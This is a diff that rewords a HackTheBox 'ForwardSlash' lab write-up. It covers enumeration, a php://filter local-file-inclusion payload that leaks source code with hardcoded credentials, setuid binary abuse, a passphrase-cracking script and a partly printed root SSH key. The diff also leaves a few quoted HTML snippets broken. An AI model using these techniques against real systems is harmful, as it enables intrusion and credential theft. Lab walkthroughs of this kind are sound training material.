@@ -6,9 +6,9 @@ points: 40
 rating: 3.8
 date: 2020-04-04
 avatar: assets/htb/forwardslash.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/ForwardSlash
 ---
+
 ## Overview
 
 ### Useful Skills and Tools
@@ -17,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/ForwardSlash
 
 ### Nmap scan
 
-I started my enumeration of this system with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-`, a shorthand telling nmap to cover every TCP port; `-sC`, which is the same as `--script=default` and fires the default enumeration scripts at the host; `-sV` for service version detection; and `-oN <name>` to write the results to a file named `<name>`.
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ nmap -p- -sC -sV -oN forwardslash.nmap <YOUR_IP>
@@ -40,39 +40,39 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.01 seconds
 ```
 
-This machine only had two ports open, `80 - HTTP` & `22 - SSH`.  Since I had no credentials to use for SSH I fired up a browser and navigated to `http://<YOUR_IP>`.
+Only two ports were exposed on this box: `80 - HTTP` and `22 - SSH`.  With no SSH credentials in hand, I opened a browser and headed to `http://<YOUR_IP>`.
 
-![This page was automatically redirected to from <YOUR_IP>](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-port80-redirect.png)
+![This page was automatically redirected to from <YOUR_IP>](assets/wu/forwardslash/img-1.png)
 
-When I connected to port 80 it automatically redirected to `forwardslash.htb`.  In order to redirect my request to get to this pageI had to add the following line to `/etc/hosts`:
+Hitting port 80 immediately bounced me over to `forwardslash.htb`.  To make that redirect resolve and reach the page, I had to append the following line to `/etc/hosts`:
 
 ```text
 <YOUR_IP>    forwardslash.htb
 ```
 
-After adding the hostname to `/etc/hosts` I navigated to `http://forwardslash.htb` and was greeted by webpage that had been defaced by the "Backslash Gang".
+With the hostname in `/etc/hosts`, I browsed to `http://forwardslash.htb` and landed on a page that the "Backslash Gang" had defaced.
 
-![title - Backslash Gang](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-forwardslash.htb.png)
+![title - Backslash Gang](assets/wu/forwardslash/img-2.png)
 
 The Backslash Gang left a message behind:
 
 > Defaced • This was ridiculous, who even uses XML and Automatic FTP Logins
 
-This looked like clues as to how they managed to get into the site.  I made note to look for services related to FTP and XML during my enumeration.  Other than this defaced page, there was not much to go off so I continued my enumeration.
+These read like hints about how they broke in.  I jotted down a reminder to watch for anything FTP- or XML-related while enumerating.  Beyond the defaced page there wasn't much else to work with, so I pressed on.
 
 ### Dirbuster - forwardslash.htb
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1.5-initial-dirbuster.png)
+![](assets/wu/forwardslash/img-3.png)
 
-Using Dirbuster I found what initially looked like a large number of files, but after doing some closer inspection, the server was simply giving a `403 - Access Denied` error to any request that contained `.htaccess` or `.htpasswd` in it.  One accessible file stuck out, however.
+Dirbuster turned up what at first seemed like a ton of files, but on closer look the server was just returning a `403 - Access Denied` for any request containing `.htaccess` or `.htpasswd`.  One reachable file did stand out, though.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-note.png)
+![](assets/wu/forwardslash/img-4.png)
 
-It appeared that one of the server owners had left the other a note.  The file `note.txt` mentioned two potential usernames: `pain` and `chiv` and also mentioned that there is a backup site. 
+It looked like one of the server's owners had left a note for the other.  The `note.txt` file referenced two possible usernames, `pain` and `chiv`, and also hinted at the existence of a backup site. 
 
 ### Virtual Host Enumeration
 
-Ippsec's video on [`HTB - Player`](%20https://www.youtube.com/watch?v=JpzREo7XLOY) describes "vhost enumeration" and explains how to search for other virtual hosts which map to the same IP address. From watching this video before I knew that you could enumerate these sites using the tool `gobuster`: 
+Ippsec's [`HTB - Player`](%20https://www.youtube.com/watch?v=JpzREo7XLOY) video covers "vhost enumeration" and shows how to discover additional virtual hosts that resolve to the same IP. Having seen it earlier, I knew `gobuster` could enumerate these sites: 
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ gobuster vhost -u http://forwardslash.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
@@ -94,56 +94,56 @@ Found: backup.forwardslash.htb (Status: 302) [Size: 33]
 ===============================================================
 ```
 
-I used a wordlist of the top 110,000 most common subdomain names, and quickly found the backup site that `chiv` had mentioned in his note.  Once again, I added this domain name to `/etc/hosts` and tried to access the site.
+Pointing it at a list of the 110,000 most common subdomains, I quickly uncovered the backup site `chiv` had referenced in his note.  As before, I added the new domain to `/etc/hosts` and went to visit it.
 
 ### The Backup site
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-backup-site.png)
+![](assets/wu/forwardslash/img-5.png)
 
-Navigating to `http://backup.forwardslash.htb` auto-redirected me once again, this time to a login page at [http://backup.forwardslash.htb/login.php](http://backup.forwardslash.htb/login.php).  Since I did not have any credentials, I signed up for a new account and logged in.
+Visiting `http://backup.forwardslash.htb` redirected me yet again, this time to a login page at [http://backup.forwardslash.htb/login.php](http://backup.forwardslash.htb/login.php).  Lacking any credentials, I just registered a fresh account and logged in.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-new-account.png)
+![](assets/wu/forwardslash/img-6.png)
 
-Once I was logged in, I was greeted by this page.  This so-called dashboard did not offer much to do.
+After logging in I was met with this page.  The supposed dashboard didn't give me much to work with.
 
-![Breaking the fourth wall](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-fun-fact.png)
+![Breaking the fourth wall](assets/wu/forwardslash/img-7.png)
 
-The machine creator left behind a message for everyone playing with a friendly public service announcement.  Don't smoke, folks.  Its disgusting and think of all of the cat-girls you can save.
+The box's author slipped in a friendly public service announcement for anyone playing.  Don't smoke, folks.  It's disgusting, and think of all the cat-girls you could save.
 
-Since I wasn't finding much to use, I started employing `cewl` to create a wordlist from each of the pages on this site and from the main page.  
+With little else to go on, I turned to `cewl` to build a wordlist from each page of this site as well as the main page.  
 
 ```text
 cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.htb/environment.php >> forwardslash.cewl
 ```
 
-This is a good habit to get into: always add new sites to `cewl` word list just in case.  This will often give you potential usernames, passwords, or new subdomain and sites to explore.
+It's a good habit to feed every new site through `cewl` just in case.  It frequently surfaces candidate usernames, passwords, or fresh subdomains and pages to dig into.
 
 ### Dirbuster redux - backup.forwardslash.htb
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-enumerating-backup.png)
+![](assets/wu/forwardslash/img-8.png)
 
-Around this time my Dirbuster report from this new subdomain had finished.  There were a lot of results to go through, so I decided to finish going through the ones I had seen when I logged in before exploring further.
+About now, my Dirbuster run against the new subdomain wrapped up.  With plenty of results to sift through, I chose to finish reviewing the ones I'd already noticed after logging in before digging deeper.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-fileupload.png)
+![](assets/wu/forwardslash/img-9.png)
 
-The URL and Submit sections on the [http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) page were disabled, but I wondered if it was something I could easily bypass by checking the HTML code.
+The URL and Submit fields on the [http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) page were disabled, but I suspected I could easily get around that by inspecting the HTML.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-disabled.png)
+![](assets/wu/forwardslash/img-10.png)
 
- As I suspected, they had simply used the "disabled" attribute for the two sections.  Removing this code made it so the fields were again active.  
+ Sure enough, they'd just slapped the "disabled" attribute on both fields.  Stripping that out re-enabled them.  
 
 ```text
-<!-- TODO: removed all the code to actually change the picture after backslash gang
+
  attacked us, simply echos as debug now -->
 ```
 
 ### Local File Inclusion testing
 
-used burp to enumerate the potential for LFI
+I used Burp to probe whether LFI was possible.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-etc-passwd.png)
+![](assets/wu/forwardslash/img-11.png)
 
-got `/etc/passwd`
+This pulled back `/etc/passwd`.
 
 ```text
 root:x:0:0:root:/root:/bin/bash 
@@ -180,9 +180,9 @@ chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
 mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-I found two users with login capability: `chiv` and `pain`. I have seen them both leaving notes to the other in the HTML code, and `note.txt` earlier.
+There were two login-capable users, `chiv` and `pain`. I'd already seen both names trading notes in the HTML and in the earlier `note.txt`.
 
-While testing different methods of both uploading files and downloading files from the server, I accidentally pasted in the URL for `http://backup.forwardslash.htb/config.php` and got the back-end code file back.
+While experimenting with various ways to upload and download files, I accidentally pasted the URL `http://backup.forwardslash.htb/config.php` and the server handed me back the source of the file.
 
 ```text
 <?php
@@ -202,13 +202,13 @@ if($link === false){
 ?>
 ```
 
-I now had what looked to be a password hash for the `www-data` user, but I knew from `/etc/passwd` that the user was not able to log into a shell.  I kept trying for all of the other sites I had seen in my enumeration using dirbuster such as `api.php`, `login.php`, `profilepicture.php` but each time I just got back the message "Permission Denied; not that way ;\)".  The winking smiley and the "not that way" line made it sound as if I was headed in the right direction, but I just needed to try a bit harder.  
+This gave me what appeared to be a password hash for `www-data`, though `/etc/passwd` told me that account couldn't get a shell.  I tried the same trick against the other pages dirbuster had found, like `api.php`, `login.php`, and `profilepicture.php`, but each one just returned "Permission Denied; not that way ;\)".  The winking face and the "not that way" phrasing suggested I was on the right track and simply needed to push a little harder.  
 
 ### Bypassing web filtering
 
-My initial thought was that there was a web-application firewall, so I searched around a bit until I found [https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/).  I kept looking for more ways after testing different bypass methods, as nothing seemed to even get a response.  I started doing a bit of research into bypassing PHP web filtering and came across a section on `PayloadsAlltheThings` that was made just for this situation with PHP file inclusion.  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)
+My first guess was that a web-application firewall was in play, so I dug around until I came across [https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/).  After trying several bypass techniques without even getting a response, I kept searching and eventually found a section in `PayloadsAlltheThings` tailored exactly to this PHP file-inclusion scenario.  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)
 
-There were various code examples for bypassing PHP filters, such as by encoding the request in base64 or rot-13.  I decided to just try using the base64 encoding first, trying `pHp://FilTer/convert.base64-encode/resource=login.php`.  Luckily for me, it worked right away!  I was able to retrieve the `login.php` page, encoded in base64.  I simply had to use the decode function in Burp to get the page code.  Unfortunately there was nothing useful in that page.  After that I went through and downloaded all of the pages I had seen in `dirbuster` until I got to `pHp://FilTer/convert.base64-encode/resource=dev/index.php` which returned the base64 string:
+The page offered several examples for defeating PHP filters, like base64- or rot-13-encoding the request.  I started with base64, submitting `pHp://FilTer/convert.base64-encode/resource=login.php`.  It worked on the first try, returning the `login.php` page as a base64 blob.  Decoding it in Burp gave me the page source, though it held nothing of value.  I then worked through every page dirbuster had found until I reached `pHp://FilTer/convert.base64-encode/resource=dev/index.php`, which returned the base64 string:
 
 ```text
 PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
@@ -245,7 +245,6 @@ if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION
 
 </html>
 
-<!-- TODO:
 Fix FTP Login
 -->
 
@@ -297,19 +296,19 @@ function ftp_get_string($ftp, $filename) {
 ?>
 ```
 
-Here was the hardcoded FTP-Autologin code that the Backslash Gang had so disdained, and I now had credentials for the user `chiv` .  I then tried using this username/password combo to SSH into the machine, and was greeted with a shell. 
+This was the hardcoded FTP auto-login the Backslash Gang had complained about, and it handed me credentials for `chiv`.  I tried the username/password pair over SSH and was dropped straight into a shell. 
 
 ## Initial Foothold
 
 #### Enumeration as user `chiv`
 
-Unfortunately, this user was not the one with the flag, so I assumed that I would need to move laterally to `pain` in order to get my first score.
+This account didn't hold the flag, so I figured I'd have to pivot laterally to `pain` to claim my first score.
 
-linpeas.sh my go-to enumeration all-in-one script
+linpeas.sh is my go-to all-in-one enumeration script.
 
-open ports -nope
+Open ports - nothing useful.
 
-users
+Users:
 
 ```text
 [+] Users with console
@@ -318,7 +317,7 @@ pain:x:1000:1000:pain:/home/pain:/bin/bash
 root:x:0:0:root:/root:/bin/bash
 ```
 
-usr/bin/backup
+usr/bin/backup:
 
 ```text
 [+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
@@ -334,7 +333,7 @@ $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
 ### The python script
 
-I had access to `pain`'s home folder, which was a bit unusual.  Inside was another note, and a python script with some ciphertext in the `encryptorinator/` folder.  
+Oddly, I could read into `pain`'s home directory.  Inside sat yet another note plus a python script alongside some ciphertext in the `encryptorinator/` folder.  
 
 ```text
 chiv@forwardslash:/home/pain$ ls
@@ -352,7 +351,7 @@ drwxr-xr-x 7 pain pain 4096 Mar 17 20:28 ..
 -rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
 ```
 
-I exfiltrated the two files to my machine to make analysis easier.
+To make analysis easier, I pulled both files back to my own box.
 
 ```text
 chiv@forwardslash:/home/pain/encryptorinator$ python -m SimpleHTTPServer 8099
@@ -361,28 +360,28 @@ Serving HTTP on 0.0.0.0 port 8099 ...
 10.10.15.82 - - [06/Jul/2020 14:06:07] "GET /ciphertext HTTP/1.1" 200 -
 ```
 
-The python script `encrypter.py` was redacted, and no longer contained the code to decrypt the ciphertext.  
+The `encrypter.py` script had been redacted and no longer held the logic needed to decrypt the ciphertext.  
 
 ```text
 print encrypt('REDACTED', 'REDACTED')
 print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
 ```
 
-At first, I thought "lets check the backups I saw while enumerating with linpeas and see if the whole script is available".  _\(By the way, there is no "whole script" and you could go ahead and decrypt it right now.\)_
+My first instinct was, "let me check the backups linpeas flagged to see if the full script is sitting somewhere".  _\(For the record, there is no "full script" and you could decrypt this right now.\)_
 
 ## Road to User
 
 ### Further enumeration
 
-In the `/usr/bin/` folder there was an interesting program that stuck out to me.
+One program in `/usr/bin/` caught my eye.
 
 ```text
 -r-sr-xr-x  1 pain   pain       13384 Mar  6 10:06  backup
 ```
 
-This program had the setuid bit set and was owned by `pain`. I thought that I may be able to use this binary to escalate privileges laterally to `pain`.
+It carried the setuid bit and was owned by `pain`, so I figured the binary might let me move laterally into `pain`'s account.
 
-In the `/var/backups` folder, I found a bunch of files that had been backed up, as well as another note from `pain`.  
+The `/var/backups` folder held a pile of backed-up files plus one more note from `pain`.  
 
 ```text
 chiv@forwardslash:/var/backups$ ls -la
@@ -413,9 +412,9 @@ Chiv, this is the backup of the old config, the one with the password we need to
 -Pain
 ```
 
-I assumed he was talking about this file: `-rw------- 1 pain pain 526 Jun 21 2019 config.php.bak` since I had found another password in the `config.php` file on the backup site earlier.  Perhaps this password was not encrypted like the previous one.  
+I figured he meant this file, `-rw------- 1 pain pain 526 Jun 21 2019 config.php.bak`, given I'd already found a password in the backup site's `config.php`.  Maybe this one wasn't encrypted like the earlier value.  
 
-and we do not have access to `/var/backups/recovery`. Will need to go back and check out that `backup` binary again. Since its in $PATH I just ran it.
+We also can't access `/var/backups/recovery`, so I'd need to revisit that `backup` binary. Since it's on $PATH, I simply ran it.
 
 ```text
 chiv@forwardslash:~$ backup
@@ -430,13 +429,13 @@ Current Time: 17:14:04
 ERROR: d09b25378e01dd1af648dca8a641e52e Does Not Exist or Is Not Accessible By Me, Exiting...
 ```
 
-hmmm...its looking for the hash of something, and says something about only working if the backup is taken in the same second, and displays the time. After some experimentation, discovered that the hash is an md5 hash of the current time in `HH:MM:SS` format. `echo $(date +%T) | md5sum | cut -c1-32` will get me a hash of the time that matches the time in the backup program, now need to script reading the file and sending the hash at the same time \(`cut` because md5sum adds  `- <filename>`at the end of its output\). 
+Interesting - it's hunting for the hash of something, notes that it only works when the backup is taken in the same second, and prints the time. A bit of experimenting revealed the hash is just an md5 of the current time in `HH:MM:SS` format. `echo $(date +%T) | md5sum | cut -c1-32` produces a hash matching the program's time; now I need to script reading the file and feeding it the hash simultaneously \(the `cut` is there because md5sum appends `- <filename>` to its output\). 
 
-Try it on the config backup. I had seen a long hash in the one I found before, maybe this one is pre-encryption.
+I'll try it against the config backup. The one I found earlier had a long hash, so maybe this is the pre-encryption version.
 
-Oooohhhh...need to make a symbolic link of the file, to the proper hash; also don't need to call `backup` ON the file, just run it in the directory you want it to work in
+Aha - I need to symlink the file to the correct hash; and I don't have to point `backup` at the file, just run it from the directory I want it to operate in.
 
-After much trial and error: getting the hash of the time wasn't working \(machine or network lag perhaps?\) so I decided to pull the hash directly from the program and symlink the backup file to it
+After plenty of trial and error: hashing the time wasn't lining up \(machine or network lag, perhaps?\), so I instead grabbed the hash straight from the program and symlinked the backup file to it.
 
 ```text
 chiv@forwardslash:/dev/shm$ ./bak.sh 
@@ -451,7 +450,7 @@ Current Time: 18:33:28
 File cannot be opened.
 ```
 
-after some more trial and error...found out that the script must be executed from user's home directory. Successfully got my test file to be read. Next, the config backup/.
+More trial and error showed the script has to be run from the user's home directory. With that, my test file was read successfully. On to the config backup.
 
 ### Finding user creds
 
@@ -483,7 +482,7 @@ if($link === false){
 ?>
 ```
 
-Tried to decrypt the password at first, though it was not a hash despite its looks, was the actual password
+I first tried to decrypt the password, but despite appearances it wasn't a hash at all - it was the password itself.
 
 ### User.txt
 
@@ -498,7 +497,7 @@ cd2c************************8cf8
 
 ### Enumeration as User `pain`
 
-Enumeration as this user was pretty short, since I had already found most everything as `chiv`.  As I always to when logging in as a new user, I checked my privileges with `sudo -l` and `groups`.
+Enumerating as this user was quick, since I'd already turned up most things as `chiv`.  As I always do with a new account, I checked my privileges using `sudo -l` and `groups`.
 
 ```text
 pain@forwardslash:/var/backups/recovery$ sudo -l
@@ -514,7 +513,7 @@ pain@forwardslash:~$ groups
 pain backupoperator
 ```
 
-The `backupoperator` group sounded familiar.  I had seen it earlier on a folder I couldn't access in `/var/backups`. 
+The `backupoperator` group rang a bell.  I'd seen it earlier on that inaccessible folder in `/var/backups`. 
 
 ### The encrypted backup file
 
@@ -527,13 +526,13 @@ drwxr-xr-x 3 root root                 4096 Jul  6 06:25 ..
 -rw-r----- 1 root backupoperator 1000000000 Jul  6 19:35 encrypted_backup.img
 ```
 
- I navigated to this folder and found the file `encrypted_backup.img`.  This had to be the backup file that `pain` had `sudo` rights to manipulate.  
+ Entering that folder, I found `encrypted_backup.img`.  This had to be the backup file `pain` was permitted to handle via `sudo`.  
 
-When trying to use `luksOpen` to decrypt the backup file, however, it prompted me for a passphrase.  The note in `pain`'s home folder had mentioned some "crypto magic" that had been applied to the key, so I went back to try to decrypt that ciphertext with the python script. 
+Running `luksOpen` against it, though, prompted for a passphrase.  The note in `pain`'s home had referenced some "crypto magic" applied to the key, so I circled back to decrypt that ciphertext with the python script. 
 
 ### Python decryption script revisited
 
-Working on script, lots of trial and error
+I worked on the script through a lot of trial and error.
 
 #### Fixing UnicodeDecodeError in Python scripts
 
@@ -541,7 +540,7 @@ Working on script, lots of trial and error
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 932: invalid continuation byte
 ```
 
-recieved error: while trying to decrypt. \(have seen this with rockyou.txt in the past as well\).  [https://github.com/wpscanteam/wpscan/issues/190](https://github.com/wpscanteam/wpscan/issues/190) - encoding problems with rockyou.txt and ciphertext solved by using `'latin'` encoding
+I hit this error while decrypting \(I've run into it with rockyou.txt before too\).  [https://github.com/wpscanteam/wpscan/issues/190](https://github.com/wpscanteam/wpscan/issues/190) - the encoding issues with rockyou.txt and the ciphertext were fixed by switching to `'latin'` encoding.
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ vi -c 'let $enc = &fileencoding | execute "!echo Encoding:  $enc" | q' ciphertext 
@@ -551,7 +550,7 @@ Encoding: latin1
 Press ENTER or type command to continue
 ```
 
-final script:
+The final script:
 
 ```python
 import string
@@ -604,7 +603,7 @@ if (__name__ == '__main__'):
       exit()
 ```
 
-Python script ouput
+Python script output:
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ python3 ./decryptor.py
@@ -612,7 +611,7 @@ plaintext found: ©¹b`ÛºK§T=ox&yorSÔaé[8vá[(ý;fryption tool, pretty secu
 The key was: theroadtorainbows
 ```
 
-Since I had now done the hard part and decrypted the backup password with my python script, the next part was fairly straightforward.  The commands we are allowed to use with sudo spell out what we can do. 
+With the hard part done and the backup password recovered via my python script, the rest was fairly easy.  The sudo-allowed commands lay out exactly what's possible. 
 
 From the CryptSetup man page: [http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html](http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html).
 
@@ -620,7 +619,7 @@ From the CryptSetup man page: [http://manpages.ubuntu.com/manpages/xenial/man8/c
 >
 >           Opens the LUKS device &lt;device&gt; and  sets  up  a  mapping  &lt;name&gt;  after  successful          verification  of  the  supplied  passphrase.  If the passphrase is not supplied via --key-file, the command prompts for it interactively.
 
-the device name will be our backup file, the `<name>` will be `backup` \(command says `/bin/mount /dev/mapper/backup ./mnt/`\) and we will need to make a directory called ./mnt/
+So the device is our backup file, the `<name>` is `backup` \(the command reads `/bin/mount /dev/mapper/backup ./mnt/`\), and we'll need to create a `./mnt/` directory.
 
 ### Getting a shell
 
@@ -661,11 +660,11 @@ ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
 -----END RSA PRIVATE KEY-----
 ```
 
-I now had an SSH key.  Since neither `pain` or `chiv` needed an RSA key to login using SSH I assumed this was `root`'s private key.
+That gave me an SSH key.  Since neither `pain` nor `chiv` needed an RSA key to log in via SSH, I figured this had to be `root`'s private key.
 
 ### Root.txt
 
-Trying to login with this key, I encountered an error I had seen before.
+Attempting to log in with the key threw an error I'd seen before.
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ ssh -i root.id_rsa root@<YOUR_IP>
@@ -680,7 +679,7 @@ Load key "root.id_rsa": bad permissions
 root@<YOUR_IP>'s password: 
 ```
 
-I knew I was right that this was root's key.  _Though, as always, you have to make sure to apply `chmod 600 <file>` to your SSH private keys before use!_
+This confirmed my hunch that it was root's key.  _As always, remember to `chmod 600 <file>` your SSH private keys before using them!_
 
 ```text
 kac0@kalimaa:~/htb/forwardslash$ chmod 600 root.id_rsa 
